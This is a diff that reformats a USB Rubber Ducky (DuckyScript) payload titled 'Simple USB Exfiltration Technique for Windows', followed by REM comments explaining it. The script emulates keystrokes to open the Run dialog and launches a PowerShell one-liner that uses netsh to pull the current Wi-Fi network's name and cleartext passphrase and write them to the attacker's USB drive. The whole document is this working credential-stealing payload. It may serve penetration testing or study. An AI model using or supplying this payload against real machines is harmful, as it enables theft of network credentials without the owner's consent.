@@ -1,1 +1,13 @@
-REM Example Simple USB Exfiltration Technique for WindowsATTACKMODE HID STORAGEDELAY 2000GUI rDELAY 100STRING powershell “$m=(Get-Volume -FileSystemLabel ‘DUCKY’).DriveLetter;netsh wlan show profile name=(Get-NetConnectionProfile).Name key=clear|?{$_-match’SSID n|Key C’}|%{($_ -split’:’)[1]}>>$m’:\’$env:computername’.txt’”ENTERREM This short Powershell one-liner executes from the Windows Run dialog.REM The drive letter of the volume with the label “DUCKY” is saved as $m.REM The netsh command will get the network name and passphrase for the currently connected network ((Get-NetConnectionProfile).Name).REM The results of the netsh command (filtered for only SSID and key) will be redirected (saved) to a file on the root of the “DUCKY” drive, saved as the computer name (in .txt format).
+REM Example Simple USB Exfiltration Technique for Windows
+ATTACKMODE HID STORAGE
+DELAY 2000
+GUI r
+DELAY 100
+STRING powershell "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter;netsh wlan show profile name=(Get-NetConnectionProfile).Name key=clear|?{$_-match'SSID n|Key C'}|%{($_ -split':')[1]}>>$m':\'$env:computername'.txt'"
+ENTER
+
+
+REM This short Powershell one-liner executes from the Windows Run dialog.
+REM The drive letter of the volume with the label “DUCKY” is saved as $m.
+REM The netsh command will get the network name and passphrase for the currently connected network ((Get-NetConnectionProfile).Name).
+REM The results of the netsh command (filtered for only SSID and key) will be redirected (saved) to a file on the root of the “DUCKY” drive, saved as the computer name (in .txt format).
